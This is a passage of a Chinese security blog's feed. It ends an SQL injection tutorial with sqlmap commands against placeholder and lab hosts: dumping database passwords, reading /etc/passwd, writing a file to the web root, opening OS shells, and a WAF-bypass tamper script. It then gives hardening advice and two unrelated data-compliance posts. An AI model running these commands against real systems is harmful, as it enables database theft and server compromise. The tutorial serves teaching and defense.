+11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
+12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
+13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 
+14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
+15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&apos;)&quot; --suffix &quot;AND (&apos;abc&apos;=&apos;abc&quot;
+16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;
+17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;
+18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
+19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &apos;foo&apos;&quot; -v 1 
+20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner 
+21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&apos;xx&apos; --dbs --level=3 -p &quot;uid&quot;
+
+简单的注入流程 :
+1.读取数据库版本，当前用户，当前数据库 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
+2.判断当前数据库用户权限 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
+3.读取所有数据库用户或指定数据库用户的密码 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
+4.获取所有数据库 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
+5.获取指定数据库中的所有表 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
+6.获取指定数据库名中指定表的字段 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
+7.获取指定数据库名中指定表中指定字段的数据 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 
+8.file-read读取web文件 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 
+9.file-write写入文件到web 
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;5.2 核心参数与模式&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;# 常规数据获取
+--current-db
+--tables -D &quot;&quot;
+--columns -T &quot;&quot; -D &quot;&quot;
+--dump -C &quot;&quot; -C &quot;&quot; -T &quot;&quot;
+# 引出权限
+--is-dba --privileges
+# 引出文件
+--file-read --file-write --file-dest
+# 引出命令
+--os-cmd= --os-shell --sql-shell
+# Post Cookie Json
+--data &quot;&quot;
+--cookie &quot;&quot;
+-r 1.txt
+# base64+json注入
+--tamper=base64encode.py
+# 分析调试
+-v=(0-6)  #详细的等级(0-6)
+--proxy &quot;http://xx:xx&quot;
+# 打乱默认指纹
+--user-agent &quot;&quot;  #自定义user-agent
+--random-agent   #随机user-agent
+--time-sec=(2,5) #延迟响应，默认为5
+# 测试Header注入
+--level=(1-5) #要执行的测试水平等级，默认为1 
+--risk=(0-3)  #测试执行的风险等级，默认为1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;--tamper=test.py&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from lib.core.convert import encodeBase64
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    if payload:      
+        payload = payload.replace(&apos;SELECT&apos;,&apos;sElEct&apos;)
+        payload = payload.replace(&apos;select&apos;,&apos;sElEct&apos;)
+        payload = payload.replace(&apos;OR&apos;,&apos;Or&apos;)
+        payload = payload.replace(&apos;or&apos;,&apos;Or&apos;)
+        payload = payload.replace(&apos;AND&apos;,&apos;And&apos;)
+        payload = payload.replace(&apos;and&apos;,&apos;And&apos;)
+        payload = payload.replace(&apos;XOR&apos;,&apos;xOr&apos;)
+        payload = payload.replace(&apos;xor&apos;,&apos;xOr&apos;)
+        payload = payload.replace(&apos;SLEEP&apos;,&apos;SleeP&apos;)
+        payload = payload.replace(&apos;sleep&apos;,&apos;SleeP&apos;)
+        payload = payload.replace(&apos;ELT&apos;,&apos;Elt&apos;)
+    return encodeBase64(payload, binary=False) if payload else payload
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;6. 防御与加固&lt;/h2&gt;
+&lt;h3&gt;6.1 预编译（prepared statements）&lt;/h3&gt;
+&lt;p&gt;将 SQL 结构 与 数据 完全分离，SQL 在执行前已被数据库编译，参数只作为“值”绑定&lt;/p&gt;
+&lt;h3&gt;6.2 输入验证与白名单&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;数字型参数：只允许数字，且限定范围&lt;/li&gt;
+&lt;li&gt;枚举值：只允许固定集合（如状态、类型、排序字段）&lt;/li&gt;
+&lt;li&gt;字符串：限制长度、字符集、格式（如正则）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;6.3 最小权限原则&lt;/h3&gt;
+&lt;p&gt;区分读写账号，禁止应用账号有（CREATE / DROP / ALTER） 权限，生产环境禁root、直连&lt;/p&gt;
+&lt;h3&gt;6.4 禁止错误回显&lt;/h3&gt;
+&lt;p&gt;关闭数据库详细错误输出，应用层统一错误响应&lt;/p&gt;
+&lt;h3&gt;6.5 数据库日志与审计&lt;/h3&gt;
+&lt;p&gt;异常sql结构、异常行为模式&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;7.数据库基础（MySQL）&lt;/h2&gt;
+&lt;h3&gt;7.1 数据库层次结构&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;数据库（Database）&lt;/strong&gt;：一整个 Excel 文件，如：&lt;code&gt;shop_db&lt;/code&gt;、&lt;code&gt;crm&lt;/code&gt;、&lt;code&gt;test&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;表（Table）&lt;/strong&gt;：文件里的每一个工作表，如：&lt;code&gt;users&lt;/code&gt;、&lt;code&gt;orders&lt;/code&gt;、&lt;code&gt;logs&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;列（Column、字段）&lt;/strong&gt;：表里的每一列，描述某一类属性，如：&lt;code&gt;id&lt;/code&gt;、&lt;code&gt;username&lt;/code&gt;、&lt;code&gt;password&lt;/code&gt;、&lt;code&gt;email&lt;/code&gt;、&lt;code&gt;created_at&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;行（Row、记录）&lt;/strong&gt;：每一行是一条具体的数据，如：用户表中的一位具体用户的信息&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;7.2 用户与权限&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;数据库用户（DB User）&lt;/strong&gt;：&lt;code&gt;root@localhost&lt;/code&gt;、&lt;code&gt;app_user@%&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;库级：访问某个库&lt;/li&gt;
+&lt;li&gt;表级：访问某个表&lt;/li&gt;
+&lt;li&gt;操作级：&lt;code&gt;SELECT&lt;/code&gt;、&lt;code&gt;INSERT&lt;/code&gt;、&lt;code&gt;UPDATE&lt;/code&gt;、&lt;code&gt;DELETE&lt;/code&gt;、&lt;code&gt;CREATE&lt;/code&gt;、&lt;code&gt;DROP&lt;/code&gt;、&lt;code&gt;ALTER&lt;/code&gt;、&lt;code&gt;GRANT&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;7.3 MySQL特性&lt;/h3&gt;
+&lt;h4&gt;7.3.1 语法特点&lt;/h4&gt;
+&lt;p&gt;大小写不敏感：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;大小写不敏感：&lt;code&gt;select&lt;/code&gt; / &lt;code&gt;SELECT&lt;/code&gt; / &lt;code&gt;SeLeCt&lt;/code&gt; 在 MySQL 中均可执行
+多种注释方式：&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-- 空格&lt;/code&gt; 后面到行尾：单行注释&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;#&lt;/code&gt; 后面到行尾：单行注释&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/* ... */&lt;/code&gt;：块注释，可跨行&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;7.3.2 元数据&lt;/h4&gt;
+&lt;p&gt;MySQL 会在系统库中保存所有库、表、列等信息&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;information_schema.SCHEMATA&lt;/code&gt;：记录数据库&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;information_schema.TABLES&lt;/code&gt;：各数据库对应的表&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;information_schema.COLUMNS&lt;/code&gt;：各表对应的字段&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;7.3.3 错误信息&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;语法错误位置&lt;/li&gt;
+&lt;li&gt;期望的语法、实际出现的内容&lt;/li&gt;
+&lt;li&gt;如果应用端把错误原样返回给前端，表名 / 字段名 / 部分数据 / SQL 结构 都可能暴露&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;sql_mode&lt;/strong&gt;对注入和过滤的影响&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;7.3.4 字符集与编码&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;过滤 + 编码不一致&lt;/li&gt;
+&lt;li&gt;多层转码：浏览器 → Web 框架 → 数据库驱动&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;7.3.5 内置函数丰富&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;字符串函数：&lt;code&gt;CONCAT&lt;/code&gt;、&lt;code&gt;SUBSTRING&lt;/code&gt;、&lt;code&gt;HEX&lt;/code&gt; 等&lt;/li&gt;
+&lt;li&gt;条件函数：&lt;code&gt;IF&lt;/code&gt;、&lt;code&gt;CASE WHEN&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;时间函数、加减函数等&lt;/li&gt;
+&lt;li&gt;特定版本：如 &lt;code&gt;LOAD_FILE()&lt;/code&gt; 等&lt;/li&gt;
+&lt;/ul&gt;
+</content:encoded></item><item><title>数据脱敏</title><link>https://acidzang.github.io/posts/sjtm/</link><guid isPermaLink="true">https://acidzang.github.io/posts/sjtm/</guid><description>去标识化与脱敏的关系.</description><pubDate>Thu, 30 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;1.去标识化与脱敏的关系&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;去标识化&lt;/strong&gt;是一种技术手段。通过技术处理使数据无法直接关联到个人，但可能通过额外信息恢复。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;静态脱敏&lt;/strong&gt;是去标识化的一种应用场景。数据在存储前经过处理，后续直接调用脱敏后的数据。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;动态脱敏&lt;/strong&gt;也是去标识化的一种应用场景。数据在实时访问或处理时进行脱敏，适用于需要实时输入和输出的场景。&lt;/li&gt;
+&lt;li&gt;动态脱敏和静态脱敏的区别在于数据处理的时机，而不是技术手段本身。&lt;/li&gt;
+&lt;li&gt;数据脱敏是一个技术术语，在法律语境下很少使用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;2.匿名化与去标识化的区别&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;匿名化&lt;/strong&gt;：不可逆，数据与个人完全分离，无法通过任何方式追溯到个人。匿名化后的数据不再受《个人信息保护法》监管。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;去标识化&lt;/strong&gt;：可逆，数据经过处理后仍可能与个人关联，但降低了识别风险。去标识化后的信息仍然属于个人信息，因为仍然可能通过额外信息恢复到个人层面。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;3.匿名化和去标识化的应用场景、分析价值&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;匿名化&lt;/strong&gt;：多用于需要完全保护个人隐私的公开场景。例如发布统计数据、研究结果等。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;去标识化&lt;/strong&gt;：多用于内部研究和分析，例如数据分析、机器学习模型训练等。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;匿名化和去标识化后的数据&lt;/strong&gt;虽然无法用于个体识别，但仍然可以在群体行为分析、趋势分析、模型训练中发挥重要作用。&lt;/li&gt;
+&lt;/ul&gt;
+</content:encoded></item><item><title>工业和信息化领域数据安全风险评估</title><link>https://acidzang.github.io/posts/sjaqfxpg/</link><guid isPermaLink="true">https://acidzang.github.io/posts/sjaqfxpg/</guid><description>工业和信息化领域数据安全风险评估文件解读</description><pubDate>Thu, 30 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;01 管理机构与评估机构&lt;/h1&gt;
+&lt;p&gt;2024年5月24日工业和信息化部发布，于2024年6月1日执行
+基于《数据安全法》、《网络安全法》、《工业和信息化领域数据安全管理办法（试行）》&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对应细则第一条、第二条、第十九条&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;1. 管理机构&lt;/h2&gt;
+&lt;p&gt;工业和信息化部统一管理，地方行为监管部门按职责监督管理&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对应细则第三条&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;2. 工作原则&lt;/h2&gt;
+&lt;p&gt;按照及时、客观、有效的原则开展数据安全风险评估&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;重要数据和核心数据处理者&lt;/li&gt;
+&lt;li&gt;按照及时、客观、有效的原则&lt;/li&gt;
+&lt;li&gt;开展数据安全风险评估评估报告&lt;/li&gt;
+&lt;li&gt;对评估结果负责&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;对应细则第四条&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;3. 评估方式&lt;/h2&gt;
+&lt;p&gt;自行或委托具有工业和信息化数据安全工作经验的第三方评估机构开展
+重要数据和核心数据处理者通过自评估或第三方评估的方式建立专业评估团队（组织管理、专业运营、技术保障、安全合规），制定完整的评估工作方案，配备有效的技术评测工具完成评估。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对应细则第七条&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;4. 委托评估&lt;/h2&gt;
+&lt;p&gt;通过订立合同或其他具有法律效力文件明确权利和责任&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;订立合同&lt;/li&gt;
+&lt;li&gt;向第三方提供必要的材料的条件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;对应细则第八条&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;5. 评估机构认定&lt;/h2&gt;
+&lt;p&gt;鼓励具有工业和信息化领域数据安全工作经验的认证机构开展第三方评估机构的能力认证&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;配备相应的人员和技术保障能力&lt;/li&gt;
+&lt;li&gt;建立第三方评估机构能力认证制度&lt;/li&gt;
+&lt;li&gt;明确第三方评估机构在管理体系、人员能力、工具设施、评估领域等方面的规范要求&lt;/li&gt;
+&lt;li&gt;跟踪第三方评估机构的服务质量&lt;/li&gt;
+&lt;li&gt;督促第三方评估机构独立、公正、客观、科学的开展数据安安全风下评估工作&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;对应细则第十二条&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;6. 评估机构义务&lt;/h2&gt;
+&lt;p&gt;明确第三方评估机构应当履行三项义务&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;对评估中知悉的国家秘密、重要数据和核心数据的目录与内容、商业秘密、个人隐私、以及与数据处理者签署的保密协议中约定的保密信息等严格保密&lt;/li&gt;
+&lt;li&gt;严格按照国家法律法规、行业监管部门有关规定以及评估标准，公正、独立的开展评估并出具评估报告，全面、准确、客观的反映重要数据和核心数据处理者的数据安全风险状况，提供务实有效的风险整改建议措施&lt;/li&gt;
+&lt;li&gt;除重要数据和核心数据处理者书面同意或法律、行政犯规另外规定外，不得向其他组织或个人提供评估中收集掌握的相关信息&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;对应细则第十三条&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;7. 监督检查&lt;/h2&gt;
+&lt;p&gt;工业和信息化部建立数据安全风险评估支撑机构库&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;行业监管部门
+&lt;ol&gt;
+&lt;li&gt;工业和信息化部
+根据技术能力、人员配备、信誉资质等情况，择优选认证机构
+建立工业和信息化数据安全风险评估支撑机构库&lt;/li&gt;
+&lt;li&gt;地方行业监管部门
+参照建立本地区数据安全风险评估支撑机构库&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;重要数据和核心数据处理者
+对行业监管部门发起的专项风险评估及监督检查予以配合，并对评估发现的相关问题及时进行改正&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应细则第十四条&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;8. 机构监管及保密要求&lt;/h2&gt;
+&lt;p&gt;行业监管部门及委托支撑机构执行保密义务&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;机构监管&lt;/li&gt;
+&lt;li&gt;行政处罚&lt;/li&gt;
+&lt;li&gt;保密要求&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;对应细则第十五条、第十六条、第十七条&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;02 评估内容与评估流程&lt;/h1&gt;
+&lt;h2&gt;1. 评估内容&lt;/h2&gt;
+&lt;p&gt;对数据处理活动的目的和方式、业务场景、安全保障措施、风险影响等要素开展
+重点评估内容：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;数据处理目的、方式、范围是否合法、正当、必要&lt;/li&gt;
+&lt;li&gt;数据安全管理制度、流程策略的制定和落实情况&lt;/li&gt;
+&lt;li&gt;数据安全组织架构、岗位配备和职责履行情况&lt;/li&gt;
+&lt;li&gt;数据安全技术防护能力建设及应用情况&lt;/li&gt;
+&lt;li&gt;数据处理活动相关人员是否熟悉数据安全相关政策法规、是否具备数据安全知识技能、是否接收数据安全相关教育培训等情况&lt;/li&gt;
+&lt;li&gt;发生数据遭到篡改、破坏、泄漏、丢失或被非法获取、非法利用等安全事件，对国家安全、公共利益的影响范围、程度等风险&lt;/li&gt;
+&lt;li&gt;涉及数据提供、委托处理、转移的，数据获取方或委托方的安全保障能力、责任义务约束和履行情况&lt;/li&gt;
+&lt;li&gt;涉及国家法律法规中规定需要申报的数据出境安全评估情形，履行数据出境安全评估要求情况&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应细则第五条&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;2. 评估期限&lt;/h2&gt;
+&lt;p&gt;数据安全风险评估结果有效期为一年
+重要数据和核心数据处理者每年至少开展一次数据安全风险评估，已评估报告首次出具日期计算。评估报告应当包括数据处理者基本情况、评估团队基本情况、重要数据的种类和数量、开展数据处理活动的情况、数据安全风险评估环境，以及数据处理活动分析、合规性评估、安全风险分析、评估结论及应对措施等
+在有效期内出现下面情形之一的，对发生变化及影响的部分开展风险评估&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;新增跨主体提供、委托处理、转移核心数据&lt;/li&gt;
+&lt;li&gt;重要数据、核心数据安全状态发生变化对数据安全造成不利影响，包括但不限于数据处理目的、方式、适用范围和安全制度策略等发生重大调整&lt;/li&gt;
+&lt;li&gt;发生涉及重要数据、核心数据安全事件&lt;/li&gt;
+&lt;li&gt;重要数据和核心数据目录备案内容发生重大变化&lt;/li&gt;
+&lt;li&gt;行业监管部门要求进行评估的其他情形&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应细则第六条&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;3. 评估思路&lt;/h2&gt;
+&lt;p&gt;以预防为主、主动发现、积极防范为原则&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;评估思路，原则目的
+&lt;ol&gt;
+&lt;li&gt;做评估：对数据处理者数据安全保护和数据处理活动进行风险评估&lt;/li&gt;
+&lt;li&gt;寻隐患：掌握数据安全总体状况，发现数据安全隐患&lt;/li&gt;
+&lt;li&gt;提建议：提出数据安全管理和技术防护措施建议&lt;/li&gt;
+&lt;li&gt;强安全：提升数据安全防攻击、防破坏、防窃取、防泄漏、防滥用能力&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;切入点
+&lt;ol&gt;
+&lt;li&gt;围绕数据处理活动&lt;/li&gt;
+&lt;li&gt;聚焦可能影响数据的保密性、完整性、可用性和数据处理合理性的安全风险&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;实现路径
+&lt;ol&gt;
+&lt;li&gt;识别要素：通过信息调研识别数据处理者，业务和信息系统，数据资产、数据处理活动、安全措施等相关要素&lt;/li&gt;
+&lt;li&gt;识别隐患：从数据安全管理、数据处理活动、数据安全技术、个人信息保护等方面识别风险隐患&lt;/li&gt;
+&lt;li&gt;提出建议：梳理问题清单，分析数据安全风险、视情屏见风险，并给出整改建议&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;4. 评估内容&lt;/h2&gt;
+&lt;p&gt;围绕数据安全管理、数据处理活动安全、数据安全技术、个人信息保护开展&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;信息调研：数据处理者基本情况、业务和信息系统、数据资产情况、数据处理活动、安去防护措施&lt;/li&gt;
+&lt;li&gt;数据安全管理：制度流程、组织机构、分类分级、人员管理、合作外包管理、安全威胁和应急管理、开发运维、云数据安全&lt;/li&gt;
+&lt;li&gt;数据处理活动安全：数据收集、数据存储、数据传输、数据使用和加工、数据提供、数据公开、数据删除销毁&lt;/li&gt;
+&lt;li&gt;数据安全技术：网络安全防护、身份鉴别与访问控制、监测预警、数据脱敏、数据防泄漏、接口安全、备份恢复、安全审计&lt;/li&gt;
+&lt;li&gt;个人信息保护：基本原则、告知同意、保护义务、主体权利、投诉举报、个人信息处理、敏感个人信息保护、大型网络平台&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;5. 评估流程&lt;/h2&gt;
+&lt;p&gt;明确数据安全风险评估五个阶段的具体工作与主要产出物&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;评估准备
+&lt;ol&gt;
+&lt;li&gt;确定评估目标、确定评估范围、组建评估团队、开展前期准备、制定评估方案&lt;/li&gt;
+&lt;li&gt;调研表、评估方案&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;信息调研
+&lt;ol&gt;
+&lt;li&gt;数据处理者调研、业务和信息系统调研、数据资产调研、数据处理活动调研、安全措施调研&lt;/li&gt;
+&lt;li&gt;处理者基本情况、业务清单、信息系统清单、数据资产清单、数据处理活动清单、数据流转图、安全措施情况&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;风险识别
+&lt;ol&gt;
+&lt;li&gt;数据安全管理、数据处理活动、数据安全技术、个人信息处理&lt;/li&gt;
+&lt;li&gt;文档查阅记录文档、人员访谈记录文档、安全核查记录文档、技术检测报告&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;综合分析
+&lt;ol&gt;
+&lt;li&gt;梳理问题清单、风险分析与评价、提出整改建议&lt;/li&gt;
+&lt;li&gt;数据安全问题清单、数据安全风险、整改建议&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;评估总结
+&lt;ol&gt;
+&lt;li&gt;风险评估报告、安全风险处置&lt;/li&gt;
+&lt;li&gt;风险评估报告&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;6. 自评估流程&lt;/h2&gt;
+&lt;p&gt;明确自评估主要实施流程&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;评估准备
+&lt;ol&gt;
+&lt;li&gt;从提高数据安全治理能力、落实法规和主管监管部门要求、高风险数据处理活动、安全态势等方面，确定评估目标&lt;/li&gt;
+&lt;li&gt;根据评估目标确定评估对象、范围和边界，明确涉及的数据资产、数据处理活动、业务等&lt;/li&gt;
+&lt;li&gt;组建自评估团队或委托第三方机构，组织业务、安全、法务、合规、运维、研发等相关部门参与&lt;/li&gt;
+&lt;li&gt;开展前期准备，制定工作计划，确定评估依据，确定评估内容，建立评估文档&lt;/li&gt;
+&lt;li&gt;制定评估方案，并获得本单位负责人支持，认可&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;评估实施
+&lt;ol&gt;
+&lt;li&gt;信息调研：数据处理者识别、业务和信息系统识别、数据资产识别、数据处理活动识别、安全防护措施识别&lt;/li&gt;
+&lt;li&gt;风险识别：从数据安全管理、数据处理活动、数据安全技术、个人信息保护等方面识别识别安全风险&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;分析总结
+&lt;ol&gt;
+&lt;li&gt;综合分析：形成风险清单、提出整改建议&lt;/li&gt;
+&lt;li&gt;评估结果：编制评估报告、进行风险处置&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;7. 检查评估流程&lt;/h2&gt;
+&lt;p&gt;进行检查评估时，参考实施&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;评估准备
+&lt;ol&gt;
+&lt;li&gt;根据掌握的数据安全态势和安全监管，确定评估目标&lt;/li&gt;
+&lt;li&gt;根据评估目标确定评估对象、范围和边界，明确涉及的数据资产、数据处理活动、业务等&lt;/li&gt;
+&lt;li&gt;组建检查评估团队，组织评估队伍制定工作计划、确定评估依据、确定评估内容、建立评估文档&lt;/li&gt;
+&lt;li&gt;组织评估团队制定评估方案&lt;/li&gt;
+&lt;li&gt;必要时，组织专家对评估方案、人员安排、评估文档等进行评审&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;评估实施
+&lt;ol&gt;
+&lt;li&gt;信息调研：处理处理者基本情况、业务和信息系统、数据资产、数据处理活动、安全防护措施&lt;/li&gt;
+&lt;li&gt;风险识别：数据安全管理、数据处理活动、数据安全技术、个人信息保护等方面&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;分析总结
+&lt;ol&gt;
+&lt;li&gt;综合分析：问题清单、整改建议、分析评价安全风险&lt;/li&gt;
+&lt;li&gt;评估结果：评估报告、风险处置&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;对应政策要点为《网络数据安全风险评估指引》&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;8. 评估手段&lt;/h2&gt;
+&lt;p&gt;人员访谈、安全核查、文档查验、技术测试四种手段&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;人员访谈：对相关人员进行访谈、核查制度规章、防护措施、安全责任落实情况&lt;/li&gt;
